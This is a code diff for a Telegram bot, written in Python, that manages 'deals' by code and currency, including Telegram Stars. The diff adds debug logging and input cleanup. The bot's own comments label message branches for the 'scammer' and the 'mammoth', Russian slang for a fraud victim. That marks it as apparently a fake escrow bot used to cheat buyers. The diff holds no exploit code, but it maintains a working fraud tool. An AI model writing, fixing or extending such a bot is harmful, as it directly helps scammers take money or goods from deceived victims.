@@ -141,12 +141,16 @@ async def cmd_start(message: Message, state: FSMContext):
         if not param.startswith("ref_"):
             deal_code = param
             deal = get_deal(deal_code)
+            
+            logger.info(f"START: deal_code={deal_code}, deal={deal}")
 
             if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                 update_deal_buyer(deal_code, user_id)
                 deal = get_deal(deal_code)
                 
                 currency_emoji = get_currency_emoji(deal[5])
+                
+                logger.info(f"START: currency={deal[5]}, is_stars={deal[5] == 'звезд'}")
                 
                 if deal[5] == "звезд":
                     await message.answer(
@@ -198,8 +202,12 @@ async def cmd_buy(message: Message):
         await message.answer(f"{E_CROSS} <b>Используйте: /buy #код-сделки</b>")
         return
 
-    deal_code = args[1].replace('#', '')
+    # Убираем # и пробелы
+    deal_code = args[1].replace('#', '').strip()
+    logger.info(f"BUY: deal_code={deal_code}")
+    
     deal = get_deal(deal_code)
+    logger.info(f"BUY: deal={deal}")
 
     if not deal:
         await message.answer(f"{E_CROSS} <b>Сделка не найдена.</b>")
@@ -1007,6 +1015,7 @@ async def confirm_deal_seller(callback: CallbackQuery):
         await callback.answer("❌ Сделка уже завершена!", show_alert=True)
         return
 
+    # ===== ЗАВЕРШАЕМ СДЕЛКУ =====
     update_deal_completed(deal_code)
     deal = get_deal(deal_code)
     
@@ -1020,7 +1029,7 @@ async def confirm_deal_seller(callback: CallbackQuery):
     if buyer_id:
         update_user_successful_deals(buyer_id)
 
-    # ===== СКАМЕРУ =====
+    # ===== СКАМЕРУ: убираем кнопку и показываем статус =====
     await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
@@ -1030,7 +1039,7 @@ async def confirm_deal_seller(callback: CallbackQuery):
         f"{E_SUCCESS} <b>Пожалуйста, дождитесь поступления товара на ваш аккаунт!</b>"
     )
 
-    # ===== МАМОНТУ =====
+    # ===== МАМОНТУ: ожидай оплату =====
     if buyer_id:
         try:
             await callback.bot.send_message(
